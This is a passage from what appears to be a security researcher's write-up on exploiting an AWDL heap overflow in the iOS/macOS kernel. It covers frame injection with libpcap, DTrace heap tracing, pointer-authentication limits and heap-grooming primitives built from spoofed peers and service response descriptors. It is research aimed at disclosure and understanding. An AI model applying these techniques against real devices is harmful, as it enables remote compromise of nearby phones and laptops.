#### u32 old\_sync\_tree\_size = this->n\_sync\_tree\_macs + 1;

#### if (old\_sync\_tree\_size >= 10 ) {

#### old\_sync\_tree\_size = 10;

#### }

#### if (old\_sync\_tree\_size == tlv->len/6 ) {

#### new\_sync\_tree\_size = old\_sync\_tree\_size;

#### } else {

#### new\_sync\_tree\_size = tlv->len/6;

#### this->n\_sync\_tree\_macs = new\_sync\_tree\_size;

#### }

#### memcpy(this->sync\_tree\_macs, &tlv->val\[0\], 6 \* new\_sync\_tree\_size);

#### ...

sync\_tree\_macs is a 60-byte inline array in the IO80211AWDLPeer structure, at offset +0x1648. That's enough space to store 10 MAC addresses. The IO80211AWDLPeer object is 0x16a8 bytes in size which means it will be allocated in the kalloc.6144 zone.

tlvCheckBounds will enforce a maximum value of 1024 for the length of the SyncTree TLV. The TLV parser will round that value down to the nearest multiple of 6 and copy that number of bytes into the sync\_tree\_macs array at +0x1648. This will be our memory corruption primitive: a linear heap buffer overflow in 6-byte chunks which can corrupt all the fields in the IO80211AWDLPeer object past +0x16a8 and then a few hundred bytes off of the end of the kalloc.6144 zone chunk. We can easily cause IO80211AWDLPeer objects to be allocated next to each other by sending AWDL frames from a large number of different spoofed source MAC addresses in quick succession. This gives us four rough primitives to think about as we start to find a path to exploitation:

1) Corrupting fields after the sync\_tree\_macs array in the IO80211AWDLPeer object:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEix1i9_s624_image7%285%29.png)

### Overflowing into the fields at the end of the peer object

2) Corrupting the lower fields of an IO80211AWDLPeer object groomed next to this one:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiiMgX_s624_image11%283%29.png)

### Overflowing into the fields at the start of a peer object next to this one

3) Corrupting the lower bytes of another object type we can groom to follow a peer in kalloc.6144:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgN4x-_s624_image30.png)

### Overflowing into a different type of object next to this peer in the same zone

4) Meta-grooming the zone allocator to place a peer object at a zone boundary so we can corrupt the early bytes of an object from another zone:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYXMH_s624_image31.png)

### Overflowing into a different type of object in a different zone

We'll revisit these options in greater detail soon.

# Getting on the air

At this point we understand enough about the AWDL frame format to start trying to get controlled, arbitrary data going over the air and reach the frame parsing entrypoint.

I tried for a long time to get the open source academic OWL project to build and run successfully, sadly without success. In order to start making progress I decided to write my own AWDL client from scratch. Another approach could have been to write a MacOS kernel module to interact with the existing AWDL driver, which may have simplified some aspects of the exploit but also made others much harder.

I started off using an old [Netgear WG111v2](https://www.netgear.com/support/product/WG111v2.aspx) WiFi adapter I've had for many years which I knew could do [monitor mode](https://en.wikipedia.org/wiki/Monitor_mode) and [frame injection](https://en.wikipedia.org/wiki/Packet_injection), albeit only on 2.4 Ghz channels. It uses an [rtl8187](https://www.aircrack-ng.org/doku.php?id=r8187) chipset. Since I wanted to use the linux drivers for these adapters I bought a [Raspberry Pi 4B](https://www.raspberrypi.org/products/raspberry-pi-4-model-b/) to run the exploit.

In the past I've used [Scapy](https://scapy.net/) for crafting network packets from scratch. Scapy can [craft and inject arbitrary 802.11 frames](https://scapy.readthedocs.io/en/latest/api/scapy.layers.dot11.html), but since we're going to need a lot of control over injection timing it might not be the best tool. Scapy uses [libpcap](https://www.tcpdump.org/) to interact with the hardware to inject raw frames so I took a look at libpcap. Some googling later I found [this excellent tutorial example](https://gist.github.com/jonhoo/7780260) which demonstrates exactly how to use libpcap to inject a raw 802.11 frame. Let dissect exactly what's required:

# Radiotap

We've seen the structure of the data in 802.11 AWDL frames; there will be an ieee80211 header at the start, an Apple OUI, then the AWDL action frame header and so on. If our WiFi adaptor were connected to a WiFi network, this might be enough information to transmit such a frame. The problem is that we're not connected to any network. This means we need to attach some metadata to our frame to tell the WiFi adaptor exactly how it should get this frame on to the air. For example, what channel and with what bandwidth and modulation scheme should it use to inject the frame? Should it attempt re-transmits until an ACK is received? What signal strength should it use to inject the frame?

[Radiotap](https://www.radiotap.org/) is a standard for expressing exactly this type of frame metadata, both when injecting frames and receiving them. It's a slightly fiddly variable-sized header which you can prepend on the front of a frame to be injected (or read off the start of a frame which you've sniffed.)

Whether the radiotap fields you specify are actually respected and used depends on the driver you are using - a driver may choose to simply not allow userspace to specify many aspects of injected frames. Here's an example radiotap header captured from a AWDL frame using the built-in MacOS packet sniffer on a MacBook Pro. Wireshark has parsed the binary radiotap format for us:

[![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgruKF_s1200_image29.png)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgruKF_s1476_image29.png)

### Wireshark parses radiotap headers in pcaps and shows them in a human-readable form

From this radiotap header we can see a timestamp, the data rate used for transmission, the channel (5.220 GHz which is channel 44) and the modulation scheme ( [OFDM](https://en.wikipedia.org/wiki/Orthogonal_frequency-division_multiplexing)). We can also see an indication of the strength of the received signal and a measure of the noise.

The [tutorial gave the following radiotap header](https://gist.github.com/jonhoo/7780260):

#### static uint8\_t u8aRadiotapHeader\[\] = {

#### 0x00, 0x00, // version

#### 0x18, 0x00, // size

#### 0x0f, 0x80, 0x00, 0x00, // included fields

#### 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //timestamp

#### 0x10, // add FCS

#### 0x00,// rate

#### 0x00, 0x00, 0x00, 0x00, // channel

#### 0x08, 0x00, // NOACK; don't retry

#### };

With knowledge of radiotap and a basic header it's not too tricky to get an AWDL frame on to the air using the [pcap\_inject](https://linux.die.net/man/3/pcap_inject) interface and a wireless adaptor in monitor mode:

#### int pcap\_inject(pcap\_t \*p, const void \*buf, size\_t size)

Of course, this doesn't immediately work and with some trial and error it seems that the rate and channel fields aren't being respected. Injection with this adaptor seems to only work at 1Mbps, and the channel specified in the radiotap header won't be the one used for injection. This isn't such a problem as we can still easily set the wifi adaptor channel manually:

#### iw dev wlan0 set channel 6

Injection at 1Mbps is exceptionally slow but this is enough to get a test AWDL frame on to the air and we can see it in Wireshark on another device in monitor mode. But nothing seems to be happening on a target device. Time for some debugging!

# Debugging with DTrace

[The SEEMOO labs paper](https://arxiv.org/pdf/1808.03156.pdf) had already suggested setting some MacOS boot arguments to enable more verbose logging from the AWDL kernel driver. These log messages were incredibly helpful but often you want more information than you can get from the logs.

For the [initial report PoC](https://bugs.chromium.org/p/project-zero/issues/detail?id=1982) I showed how to use the MacOS kernel debugger to modify an AWDL frame which was about to be transmitted. Typically, in my experience, the MacOS kernel debugger is exceptionally unwieldy and unreliable. Whilst you can [technically script it using lldb's python bindings](https://blog.quarkslab.com/an-overview-of-macos-kernel-debugging.html), I wouldn't recommend it.

Apple does have one trick up their sleeve however; [DTrace](http://dtrace.org/blogs/about/)! Where the MacOS kernel debugger is awful in my opinion, dtrace is exceptional. DTrace is a dynamic tracing framework originally developed by Sun Microsystems for Solaris. It's been ported to many platforms including MacOS and ships by default. It's the magic behind tools such as [Instruments](https://en.wikipedia.org/wiki/Instruments_(software)). DTrace allows you to hook in little snippets of tracing code almost wherever you want, both in userspace programs, and, amazingly, the kernel. Dtrace has its quirks. Hooks are written in the D language which doesn't have loops and the scoping of variables takes a little while to get your head around, but it's the ultimate debugging and reversing tool.

For example, I used this dtrace script on MacOS to log whenever a new IO80211AWDLPeer object was allocated, printing it's heap address and MAC address:

#### self char\* mac;

#### fbt:com.apple.iokit.IO80211Family:\_ZN15IO80211AWDLPeer21withAddressAndManagerEPKhP22IO80211AWDLPeerManager:entry {

#### self->mac = (char\*)arg0;

#### }

#### fbt:com.apple.iokit.IO80211Family:\_ZN15IO80211AWDLPeer21withAddressAndManagerEPKhP22IO80211AWDLPeerManager:return

#### printf("new AWDL peer: %02x:%02x:%02x:%02x:%02x:%02x allocation:%p", self->mac\[0\], self->mac\[1\], self->mac\[2\], self->mac\[3\], self->mac\[4\], self->mac\[5\], arg1);

#### }

Here we're creating two hooks, one which runs at a function entry point and the other which runs just before that same function returns. We can use the self-> syntax to pass variables between the entry point and return point and DTrace makes sure that the entries and returns match up properly.

We have to use the mangled C++ symbol in dtrace scripts; using c++filt we can see the demangled version:

#### $ c++filt -n \_ZN15IO80211AWDLPeer21withAddressAndManagerEPKhP22IO80211AWDLPeerManager

#### IO80211AWDLPeer::withAddressAndManager(unsigned char const\*, IO80211AWDLPeerManager\*)

The entry hook "saves" the pointer to the MAC address which is passed as the first argument; associating it with the current thread and stack frame. The return hook then prints out that MAC address along with the return value of the function (arg1 in a return hook is the function's return value) which in this case is the address of the newly-allocated IO80211AWDLPeer object.

With DTrace you can easily prototype custom heap logging tools. For example if you're targeting a particular allocation size and wish to know what other objects are ending up in there you could use something like the following DTrace script:

#### /\\* some globals with values \*/

#### BEGIN {

#### target\_size\_min = 97;

#### target\_size\_max = 128;

#### }

#### fbt:mach\_kernel:kalloc\_canblock:entry {

#### self->size = \*(uint64\_t\*)arg0;

#### }

#### fbt:mach\_kernel:kalloc\_canblock:return

#### /self->size >= target\_size\_min \|\|

#### self->size <= target\_size\_max   /

#### {

#### printf("target allocation %x =  %x", self->size, arg1);

#### stack();

#### }

The expression between the two /'s allows the hook to be conditionally executed. In this case limiting it to cases where kalloc\_canblock has been called with a size between target\_size\_min and target\_size\_max. The built-in stack() function will print a stack trace, giving you some insight into the allocations within a particular size range. You could also use ustack() to continue that stack trace in userspace if this kernel allocation happened due to a syscall for example.

DTrace can also safely dereference invalid addresses without kernel panicking, making it very useful for prototyping and debugging heap grooms. With some ingenuity it's also possible to do things like dump linked-lists and monitor for the destruction of particular objects.

I'd really recommend spending some time learning DTrace; once you get your head around its esoteric programming model you'll find it an immensely powerful tool.

# Reaching the entrypoint

Using DTrace to log stack frames I was able to trace the path legitimate AWDL frames took through the code and determine how far my fake AWDL frames made it. Through this process I discovered that there are, at least on MacOS, two AWDL parsers in the kernel: the main one we've already seen inside the IO80211Family kext and a second, much simpler one in the driver for the particular chipset being used. There were three checks in this simpler parser which I was failing, each of which meant my fake AWDL frames never made it to the IO80211Family code:

Firstly, the source MAC address was being validated. MAC addresses actually contain multiple fields:

[![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgssUz_s1200_image6%289%29.png)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgssUz_s1999_image6%289%29.png)

### The first half of a MAC address is an OUI. The least significant bit of the first byte defines whether the address is multicast or unicast. The second bit defines whether the address is locally administered or globally unique.

### Diagram used under [CC BY-SA 2.5](https://creativecommons.org/licenses/by-sa/2.5/) By Inductiveload, modified/corrected by Kju - SVG drawing based on PNG uploaded by User:Vtraveller. This can be found on Wikipedia [here](https://commons.wikimedia.org/w/index.php?curid=1852032)

The source MAC address 01:23:45:67:89:ab from the libpcap example was an unfortunate choice as it has the multicast bit set. AWDL only wants to deal with unicast addresses and rejects frames from multicast addresses. Choosing a new MAC address to spoof without that bit set solved this problem.

The next check was that the first two TLVs in the variable-length payload section of the frame must be a type 4 (sync parameters) then a type 6 (service parameters.)

Finally the channel number in the sync parameters had to match the channel on which the frame had actually been received.

With those three issues fixed I was finally able to get arbitrary controlled bytes to appear at the actionFrameReport method on a remote device and the next stage of the project could begin.

# A framework for an AWDL client

We've seen that AWDL uses time division multiplexing to quickly switch between the channels used for AWDL (typically 6 and 44) and the channel used by the access point the device is connected to. By parsing the AWDL synchronization parameters TLV in the PSF and MIF frames sent by AWDL peers you can calculate when they will be listening in the future. The OWL project uses the linux [libev](http://software.schmorp.de/pkg/libev.html) library to try to only transmit at the right moment when other peers will be listening.

There are a few problems with this approach for our purposes:

Firstly, and very importantly, this makes targeting difficult. AWDL action frames are (usually) sent to a broadcast destination MAC address (ff:ff:ff:ff:ff:ff.) It's a mesh network and these frames are meant to be used by all the peers for building up the mesh.

Whilst exploiting every listening AWDL device in proximity at the same time would be an interesting research problem and make for a cool demo video, it also presents many challenges far outside the initial scope. I really needed a way to ensure that only devices I controlled would process the AWDL frames I sent.

With some experimentation it turned out that all AWDL frames can also be sent to unicast addresses and devices would still parse them. This presents another challenge as the AWDL virtual interface's MAC address is randomly generated each time the interface is activated. For testing on MacOS it suffices to run:

#### ifconfig awdl0

to determine the current MAC address. For iOS it's a little more involved; my chosen technique has been to sniff on the AWDL social channels and correlate signal strength with movements of the device to determine its current AWDL MAC.

There's one other important difference when you send an AWDL action frame to a unicast address: if the device is currently listening on that channel and receives the frame, it will send an [ACK](https://stackoverflow.com/questions/37040303/why-do-802-11-acknowledgement-frames-have-no-source-mac). This turns out to be extremely helpful. We will end up building some quite complex primitives using AWDL action frames, abusing the protocol to build a weird machine. Being able to tell whether a target device really received a frame or not means we can treat AWDL frames more like a reliable transport medium. For the typical usage of AWDL this isn't necessary; but our usage of AWDL is not going to be typical.

This ACK-sniffing model will be the building block for our AWDL frame injection API.

# Acktually receiving ACKs

Just because the ACKs are coming over the air now doesn't mean we actually see them. Although the WiFi adaptor we're using for injection must be technically capable of receiving ACKs (as they are a fundamental protocol building block), being able to see them on the monitor interface isn't guaranteed.

[![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgph0L_s1200_image20%281%29.png)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgph0L_s1999_image20%281%29.png)

### A screenshot of wireshark showing a spoofed AWDL frame followed by an Acknowledgement from the target device.

The libpcap interface is quite generic and doesn't have any way to indicate that a frame was ACKed or not. It might not even be the case that the kernel driver is aware whether an ACK was received. I didn't really want to delve into the injection interface kernel drivers or firmware as that was liable to be a major investment in itself so I tried some other ideas.

ACK frames in 802.11g and 802.11a are timing based. There's a short window after each transmitted frame when the receiver can ACK if they received the frame. It's for this reason that ACK frames don't contain a source MAC address. It's not necessary as the ACK is already perfectly correlated with a source device due to the timing.

If we also listen on our injection interface in monitor mode we might be able to receive the ACK frames ourself and correlate them. As mentioned, not all chipsets and drivers actually give you all the management frames.

For my early prototypes, I managed to find a pair in my box of WiFi adaptors where one would successfully inject on 2.4ghz channels at 1Mbps and the other would successfully sniff ACKs on that channel at 1Mbps.

1Mbps is exceptionally slow; a relatively large AWDL frame ends up being on the air for 10ms or more at that speed, so if your availability window is only a few ms you're not going to get many frames per second. Still, this was enough to get going.

The injection framework I built for the exploit uses two threads, one for frame injection and one for ACK sniffing. Frames are injected using the try\_inject function, which extracts the spoofed source MAC address and signals to the second sniffing thread to start looking for an ACK frame being sent to that MAC.

Using a [pthread condition variable](https://pubs.opengroup.org/onlinepubs/009695399/functions/pthread_cond_timedwait.html), the injecting thread can then wait for a limited amount of time during which the sniffing thread may or may not see the ACK. If the sniffing thread does see the ACK it can record this fact then signal the condition variable. The injection thread will stop waiting and can check whether the ACK was received.

Take a look at try\_inject\_internal in the exploit for the mutex and condition variable setup code for this.

There's a wrapper around try\_inject called inject which repeatedly calls try\_inject until it succeeds. These two methods allow us to do all the timing sensitive and insensitive frame injection we need.

These two methods take a variable number of pkt\_buf\_t pointers; a simple custom variable-sized buffer wrapper object. The advantage of this approach is that it allows us to quickly prototype new AWDL frame structures without having to write boilerplate code. For example, this is all the code required to inject a basic AWDL frame and re-transmit it until the target receives it:

#### inject(RT(),

#### WIFI(dst, src),

#### AWDL(),

#### SYNC\_PARAMS(),

#### SERV\_PARAM(),

#### PKT\_END());

Investing a little bit of time building this API saved a lot of time in the long run and made it very easy to experiment with new ideas.

With an injection framework finally up and running we can start to think about how to actually exploit this vulnerability!

# The new challenges on A12/A13

The Apple A12 SOC found in the iPhone Xr/Xs contained the first commercially-available ARM CPU implementing the [ARM-8.3](https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/armv8-a-architecture-2016-additions) optional Pointer Authentication feature. This was released in September 2018. [This post from Project Zero researcher Brandon Azad](https://projectzero.google/2019/02/examining-pointer-authentication-on.html) covers PAC and its implementation by Apple in great detail, as does [this presentation from the 2019 LLVM developers meeting](https://llvm.org/devmtg/2019-10/slides/McCall-Bougacha-arm64e.pdf).

Its primary use is as a form of Control Flow Integrity. In theory all function pointers present in memory should contain a Pointer Authentication Code in their upper bits which will be verified after the pointer is loaded from memory but before it's used to modify control flow.

In almost all cases this PAC instrumentation will be added by the compiler. There's [a really great document from the clang team](https://github.com/apple/llvm-project/blob/apple/master/clang/docs/PointerAuthentication.rst) which goes into great detail about the implementation of PAC from a compiler point of view and the security tradeoffs involved. It has a brilliant section on the threat model of PAC which frankly and honestly discusses the cases where PAC may help and the cases where it won't. Documentation like this should ship with every mitigation.

Having a publicly documented threat model helps everyone understand the intentions behind design decisions and the tradeoffs which were necessary. It helps build a common vocabulary and helps to move discussions about mitigations away from a focus on security through obscurity towards a qualitative appraisal of their strengths and weaknesses.

Concretely, the first hurdle PAC will throw up is that it will make it harder to forge vtable pointers.

All OSObject-derived objects have virtual methods. IO80211AWDLPeer, like almost all IOKit C++ classes derives from OSObject so the first field is a vtable pointer. As we saw in the heap-grooming sketches earlier, by spraying IO80211AWDLPeer objects then triggering the heap overflow we can easily gain control of a vtable pointer. This technique was used in [Mateusz Jurczyk](https://twitter.com/j00ru)'s [Samsung MMS remote exploit](https://projectzero.google/2020/07/mms-exploit-part-3-constructing-primitives.html) and [Natalie Silvanovich](https://twitter.com/natashenka)'s [remote WebRTC exploit](https://projectzero.google/2020/08/exploiting-android-messengers-part-2.html) this year.

Kernel virtual calls have gone from looking like this on A11 and below:

#### LDR   X8, \[X20\]      ; load vtable pointer

#### LDR   X8, \[X8,\#0x38\] ; load function pointer from vtable

#### MOV   X0, X20

#### BLR   X8             ; call virtual function

to this on A12 and above:

#### LDR   X8, \[X20\]           ; load vtable pointer

#### ; authenticate vtable pointer using A-family data key and zero context

#### ; if authentication passes, add 0x38 to vtable pointer, load value

#### ; at that address into X9 and store X8+0x38 back to X8 without a PAC

#### LDRAA X9, \[X8,\#0x38\]!

#### ; overwrite the upper 16 bits of X8 with the constant 0xFFFC

#### ; this is a hash of the mangled symbol; constant at each callsite

#### MOVK  X8, \#0xFFFC,LSL\#48

#### MOV   X0, X20

#### ; authenticate virtual function pointer with A-family instruction key

#### ; and context value where the upper 16 bits are a hash of the

#### ; virtual function prototype and the lower 48 bits are the runtime

#### ; address of the virtual function pointer in the vtable

#### BLRAA X9, X8

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEghJYl_s624_image2%2815%29.png)

### Diagrammatic view of a C++ virtual call in ARM64e showing the keys and discriminators used

What does that mean in practice?

If we don't have a signing gadget, then we can't trivially point a vtable pointer to an arbitrary address. Even if we could, we'd need a data and instruction family signing gadget with control over the discriminator.

We can swap a vtable pointer with any other A-family 0-context data key signed pointer, however the virtual function pointer itself is signed with a context value consisting of the address of the vtable entry and a hash of the virtual function prototype. This means we can't swap virtual function pointers from one vtable into another one (or more likely into a fake vtable to which we're able to get an A-family data key signed pointer.)

We can swap one vtable pointer for another one to cause a type confusion, however every virtual function call made through that vtable pointer would have to be calling a function with a matching prototype hash. This isn't so improbable; a fundamental building block of object-oriented programming in C++ is to call functions with matching prototypes but different behaviour via a vtable. Nevertheless you'd have to do some thinking to come up with a generic defeat using this approach.

An important observation is that the vtable pointers themselves have no address diversity; they're signed with a zero-context. This means that if we can disclose a signed vtable pointer for an object of type A at address X, we can overwrite the vtable pointer for another object of type A at a different address Y.

This might seem completely trivial and uninteresting but remember: we only have a linear heap buffer overflow. If the vtable pointer had address diversity then for us to be able to safely corrupt fields after the vtable in an adjacent object we'd have to first disclose the exact vtable pointer following the object which we can overflow out of. Instead we can disclose any vtable pointer for this type and it will be valid.

The [clang design doc explains why this is](https://github.com/apple/llvm-project/blob/apple/master/clang/docs/PointerAuthentication.rst):

It is also known that some code in practice copies objects containing v-tables with memcpy, and while this is not permitted formally, it is something that may be invasive to eliminate.

Right at the end of this document they also say "attackers can be devious." On A12 and above we can no longer trivially point the vtable pointer to a fake vtable and gain arbitrary PC control fairly easily. Guess we'll have to get devious :)

# Some initial ideas

Initially I continued using the iOS 12 beta 1 kernelcache when searching for exploitation primitives and performing the initial reversing to better understand the layout of the IO80211AWDLPeer object. This turned out to be a major mistake and a few weeks were spent following unproductive leads:

In the iOS 12 beta 1 kernelcache the fields following the sync\_tree\_macs buffer seemed uninteresting, at least from the perspective of being able to build a stronger primitive from the linear overflow. For this reason my initial ideas looked at corrupting the fields at the beginning of an IO80211AWDLPeer object which I could place subsequently in memory, option 2 which we saw earlier:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzMmI_s624_image21.png)

### Spoofing many source MAC addresses makes allocating neighbouring IO80211AWDLPeer objects fairly easy. The synctree buffer overflow then allows corrupting the lower fields of an IO80211AWDLPeer in addition to the upper fields

Almost certainly we're going to need some kind of memory disclosure primitive to land this exploit. My first ideas for building a memory disclosure primitive involved corrupting the linked-list of peers. The data structure holding the peers is in fact much more complex than a linked list, it's more like a priority queue with some interesting behaviours when the queue is modified and a distinct lack of [safe unlinking](https://msrc-blog.microsoft.com/2009/05/26/safe-unlinking-in-the-kernel-pool/) and the like. I'd expect iOS to start slowly migrating to using data-PAC for linked-list integrity, but for now this isn't the case. In fact these linked lists don't even have the most basic safe-unlinking integrity checks yet.

The start of an IO80211AWDLPeer object looks like this:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjtGgX_s495_image9%283%29.png)

### All IOKit objects inheriting from OSObject have a vtable and a reference count as their first two fields. In an IO80211AWDLPeer these are followed by a hash\_bucket identifier, a peer\_listflink and blink, the peer's MAC address and the peer's peer\_manager pointer.

My first ideas revolved around trying to partially corrupt a peer linked-list pointer. In hindsight, there's an obvious reason why this doesn't work (which I'll discuss in a bit), but let's remain enthusiastic and continue on for now...

Looking through the places where the linked list of peers seemed to be used it looked like perhaps the IO80211AWDLPeerManager::updatePeerListBloomFilter method might be interesting from the perspective of trying to get data leaked back to us. Let's take a look at it:

#### IO80211AWDLPeerManager::updatePeerListBloomFilter(){

#### int n\_peers = this->peers\_list.n\_elems;

#### if (!this->peer\_bloom\_filters\_enabled) {

#### return 0;

#### }

#### bzero(this->bloom\_filter\_buf, 0xA00uLL);

#### this->n\_macs\_in\_bloom\_filter = 0;

#### IO80211AWDLPeer\* peer = this->peers\_list.head;

#### int n\_peers\_in\_filter = 0;

#### for (;

#### n\_peers\_in\_filter < n\_peers && n\_peers\_in\_filter < 0x100;

#### n\_peers\_in\_filter++) {

#### this->bloom\_filter\_macs\[n\_peers\_in\_filter\] = peer.mac;

#### peer = peer->flink;

#### }

#### bloom\_filter\_create(10\*(n\_peers\_in\_filter+7) & 0xff8,

#### 0,

#### n\_peers\_in\_filter,

#### this->bloom\_filter\_macs,

#### this->bloom\_filter\_buf);

#### if (n\_peers\_in\_filter){

#### this->updateBroadcastMI(9, 1, 0);    }

#### return 0;

#### }

From the IO80211AWDLPeerManager it's reading the peer list head pointer as well as a count of the number of entries in the peer list. For each entry in the list it's reading the MAC address field into an array then builds a [bloom filter](https://en.wikipedia.org/wiki/Bloom_filter) from that buffer.

The interesting part here is that the list traversal is terminated using a count of elements which have been traversed rather than by looking for a termination pointer value at the end of the list (eg a NULL or a pointer back to the head element.) This means that potentially if we could corrupt the linked-list pointer of the second-to-last peer to be processed we could point it to a fake peer and get data at a controlled address added into the bloom filter. updateBroadcastMI looks like it will add that bloom filter data to the Master Indication frame in the bloom filter TLV, meaning we could get a bloom filter containing data read from a controlled address sent back to us. Depending on the exact format of the bloom filter it would probably be possible to then recover at least some bits of remote memory.

It's important to emphasize at this point that due to the lack of a remote KASLR leak and also the lack of a remote PAC signing gadget or vtable disclosure, in order to corrupt the linked-list pointer of an adjacent peer object we have no option but to corrupt its vtable pointer with an invalid value. This means that if any virtual methods were called on this object, it would almost certainly cause a kernel panic.

The first part of trying to get this to work was to work out how to build a suitable heap groom such that we could overflow from a peer into the second-to-last peer in the list which would be processed

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBRqG_s621_image10%283%29.png)

### Both the linked-list order and the virtual memory order need to be groomed to allow a targeted partial overflow of the final linked-list pointer to be traversed. In this layout we'd need to overflow from 2 into 6 to corrupt the final pointer from 6 to 7.

There is a mitigation from a few years ago in play here which we'll have to work around; namely the randomization of the initial zone freelists which adds a slight element of randomness to the order of the allocations you will get for consecutive calls to kalloc for the same size. The randomness is quite minimal however so the trick here is to be able to pad your allocations with "safe" objects such that even though you can't guarantee that you always overflow into the target object, you can mostly guarantee that you'll overflow into that object or a safe object.

We need two primitives: Firstly, we need to understand the semantics of the list. Secondly, we need some safe objects.

# The peer list

With a bit of reversing we can determine that the code which adds peers to the list doesn't simply add them to the start. Peers which are first seen on a 2.4GHz channel (6) do get added this way, but peers first seen on a 5GHz channel (44) are inserted based on their [RSSI](https://en.wikipedia.org/wiki/Received_signal_strength_indication) (received signal strength indication - a unitless value approximating signal strength.) Stronger signals mean the peer is probably physically closer to the device and will also be closer to the start of the list. This gives some nice primitives for manipulating the list and ensuring we know where peers will end up.

# Safe objects

The second requirement is to be able to allocate arbitrary, safe objects. Our ideal heap grooming/shaping objects would have the following primitives:

1) arbitrary size

2) unlimited allocation quantity

3) allocation has no side effects

4) controlled contents

5) contents can be safely corrupted

6) can be free'd at an arbitrary, controlled point, with no side effects

Of course, we're completely limited to objects we can force to be allocated remotely via AWDL so all the tricks from local kernel exploitation don't work. For example, I and others have used various forms of mach messages, unix pipe buffers, OSDictionaries, IOSurfaces and more to build these primitives. None of these are going to work at all. AWDL is sufficiently complicated however that after some reversing I found a pretty good candidate object.

# Service response descriptor (SRD)

This is my reverse-engineered definition of the services response descriptor TLV (type 2):

#### { u8  type

#### u16 len

#### u16 key\_len

#### u8  key\_val\[key\_len\]

#### u16 value\_total\_size

#### u16 fragment\_offset

#### u8  fragment\[len-key\_len-6\] }

It has two variable-sized fields: key\_val and fragment. The key\_length field defines the length of the key\_val buffer, and the length of fragment is the remaining space left at the end of the TLV. The parser for this TLV makes a kalloc allocation of val\_length, an arbitrary u16. It then memcpy's from fragment into that kalloc buffer at offset frag\_offset:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjUbCR_s624_image22.png)

### The service\_response technique gives us a powerful heap grooming primitive

I believe this is supposed to be support for receiving out-of-order fragments of service request responses. It gives us a very powerful primitive for heap grooming. We can choose an arbitrary allocation size up to 64k and write an arbitrary amount of controlled data to an arbitrary offset in that allocation and we only need to provide the offset and content bytes.

This also gives us a kind of amplification primitive. We can bundle quite a lot of these TLVs in one frame allowing us to make megabytes of controlled heap allocations with minimal side effects in just one AWDL frame.

This SRD technique in fact almost completely meets criteria 1-5 outlined above. It's almost perfect apart from one crucial point; how can we free these allocations?

Through static reversing I couldn't find how these allocations would be free'd, so I wrote a dtrace script to help me find when those exact kalloc allocations were free'd. Running this dtrace script then running a test AWDL client sending SRDs I saw the allocation but never the free. Even disabling the AWDL interface, which should clean up most of the outstanding AWDL state, doesn't cause the allocation to be freed.

This is possibly a bug in my dtrace script, but there's another theory: I wrote another test client which allocated a huge number of SRDs. This allocated a substantial amount of memory, enough to be visible using zprint. And indeed, running that test client repeatedly then running zprint you can observe the inuse count of the target zone getting larger and larger. Disabling AWDL doesn't help, neither does waiting overnight. This looks like a pretty trivial memory leak.

Later on we'll examine the cause of this memory leak but for now we have a heap allocation primitive which meets criteria 1-5, that's probably good enough!

# A first attempt at a useful corruption

I managed to build a heap groom which gets the linked-list and heap objects set up such that I can overflow into the second-to-last peer object to be processed:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3ijc_s624_image16%281%29.png)

### By surrounding peer objects with a sufficient number of safe objects we can ensure that the linear corruption either hits the right peer object or a safe object

The trick is to ensure that the ratio of safe objects to peers is sufficiently high that you can be (reasonably) sure that the two target peers will only be next to each other or next to safe objects (they won't be next to other peers in the list.) Even though you may not be able to force the two peers to be in the correct order as shown in the diagram, you can at least make the corruption safe if they aren't, then try again.

When writing the code to build the SyncTree TLV I realized I'd made a huge oversight...

My initial idea had been to only partially overwrite a valid linked-list pointer element:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9Z7I_s494_image12%285%29.png)

### If we could partially overflow the peer\_list\_flink pointer we could potentially move it to point it somewhere nearby. In this illustration by moving it down by 8 bytes we could potentially get some bytes of a peer\_list\_blink added to the peer MACs bloom filter. A partial overwrite doesn't directly give a relative add or subtract primitive, but with some heap grooming overwriting the lower 2 bytes can yield something similar

But when you actually look more closely at the memory layout taking into account the limitations of the corruption primitive:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj7QcT_s494_image14%283%29.png)

### Computing the relative offsets between two IO80211AWDLPeers next to each other in memory it turns out that a useful partial overwrite of peer\_list\_flink isn't possible as it lies on a 6-byte boundary from the lower peer's sync\_tree\_macs array

This is not a useful type of partial overwrite and it took a lot of effort to make this heap groom work only to realize in hindsight this obvious oversight.

Attempting to salvage something from all this work I tried instead to just completely overwrite the linked-list pointer. We'd still need some other vulnerability or technique to determine what we should overwrite with but it would at least be some progress to see a read or write from a controlled address.

Alas, whilst I'm able to do the overflow, it appears that the linked-list of peers is being continually traversed in the background even when there's no AWDL traffic and virtual methods are being called on each peer. This will make things significantly harder without first knowing a vtable pointer.

Another option would be to trigger the SyncTree overflow twice during the parsing of a single frame. Recall the code in actionFrameReport:

